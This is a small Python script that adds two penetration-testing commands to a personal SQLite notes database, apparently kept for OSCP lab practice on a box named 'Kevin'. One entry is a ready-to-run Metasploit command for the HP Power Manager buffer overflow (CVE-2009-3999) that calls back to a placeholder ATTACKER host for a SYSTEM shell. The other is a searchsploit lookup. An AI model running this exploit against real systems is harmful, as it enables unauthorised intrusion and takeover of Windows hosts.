#!/usr/bin/env python3
"""Kevin box patch -- HP Power Manager buffer overflow"""
import sqlite3, os
DB_PATH = os.path.expanduser("~/.oscp_commands.db")
commands = [
    {
        "tool": "msfconsole",
        "description": "HP Power Manager formExportDataLogs buffer overflow -- CVE-2009-3999 -- gives SYSTEM on Windows 7",
        "command": "use exploit/windows/http/hp_power_manager_filename; set RHOSTS TARGET; set LHOST ATTACKER; set LPORT 443; run",
        "category": "exploitation",
        "tags": "windows,bufferoverflow,hp,powermanager,metasploit,cve-2009-3999,system"
    },
    {
        "tool": "searchsploit",
        "description": "HP Power Manager -- two CVEs exist. Use formExportDataLogs (CVE-2009-3999) not login overflow (CVE-2009-2685) for Windows 7",
        "command": "searchsploit HP Power Manager",
        "category": "exploitation",
        "tags": "windows,bufferoverflow,hp,powermanager,searchsploit,cve"
    },
]
def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0; skipped = 0
    for e in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (e["command"],))
        if c.fetchone():
            print(f"  [~] Skipped: {e['tool']} -- {e['description'][:55]}")
            skipped += 1
        else:
            c.execute("INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (e["tool"], e["description"], e["command"], e["category"], e["tags"]))
            print(f"  [+] Added: {e['tool']} -- {e['description'][:55]}")
            added += 1
    conn.commit(); conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")
if __name__ == "__main__":
    run()
